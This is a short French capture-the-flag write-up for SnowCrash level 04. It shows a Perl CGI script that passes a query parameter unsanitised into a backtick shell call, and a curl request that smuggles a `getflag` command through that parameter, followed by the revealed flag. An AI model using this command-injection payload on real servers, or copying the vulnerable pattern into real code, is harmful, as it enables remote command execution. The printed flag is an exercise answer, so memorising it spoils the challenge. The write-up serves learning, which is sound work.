# Level 04
Le répertoire de ce niveau contient le script perl suivant:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```

Le commentaire en haut du script nous donne un indice qui nous permet de comprendre que le script en question tourne sur un serveur web local sur le port 4747.

Le script renvoie la valeur retournée par `echo %x` ou `%x` correspond au query param `x`

Par exemple, si on passe `test` dans le param `x`, le serveur retourne `test`

```sh
level04@SnowCrash:~$ curl localhost:4747?x=test
test
```
On va donc utiliser [l'operateur backtick](https://perldoc.perl.org/perlop#Quote-Like-Operators) en perl qui va nous permettre de substituer une commande par le résultat de son exécution:
```sh
curl localhost:4747?x=`getflag`
```

Le serveur va donc nous renvoyer le retour de getflag: `ne2searoevaevoem4ov4ar8ap`